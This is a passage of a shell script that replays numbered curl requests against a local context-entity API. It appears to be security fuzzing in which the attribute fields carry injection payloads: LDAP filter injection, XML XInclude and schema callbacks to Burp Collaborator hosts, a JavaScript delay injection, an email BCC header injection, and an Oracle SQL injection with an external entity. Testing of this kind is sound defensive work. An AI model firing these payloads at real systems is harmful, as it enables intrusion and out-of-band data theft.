(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": ".\/test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 199"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "cpx52c9v5m)(objectClass=*",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 200"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "nffmtbeis6)(!(objectClass=*)",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 201"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "k02jmai96o)(!(!(objectClass=*))",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 202"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "*)(objectClass=*",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 203"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "*)(!(objectClass=*)",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 204"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "<ftb xmlns=\"http:\/\/a.b\/\" xmlns:xsi=\"http:\/\/www.w3.org\/2001\/XMLSchema-instance\" xsi:schemaLocation=\"http:\/\/a.b\/ http:\/\/uqoiwncygveymqg2062ibibx2o8fy3orofg2bq0.burpcollaborator.net\/ftb.xsd\">ftb<\/ftb>",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 205"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "<sis xmlns:xi=\"http:\/\/www.w3.org\/2001\/XInclude\"><xi:include href=\"http:\/\/8gpwm12c694cc46gqksw1w1bs2ytohe5ft7g24r.burpcollaborator.net\/foo\"\/><\/sis>",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 206"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test]]>><",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 207"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test'+(function(){if(typeof a585g===\"undefined\"){var a=new Date();do{var b=new Date();}while(b-a<20000);a585g=1;}}())+'",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 208"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test\r\nBCC:user@zgjnms236043cv67qbsn1n12styko8ew6puhhc51.burpcollaborator.net\r\nuww: y",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 209"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % fwclp SYSTEM \"http:\/\/ji57oc4n8k6nef8rsvu7373mud04qsggj4br7fw.burpcollab'||'orator.net\/\">%fwclp;]>'),'\/l') from dual)",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

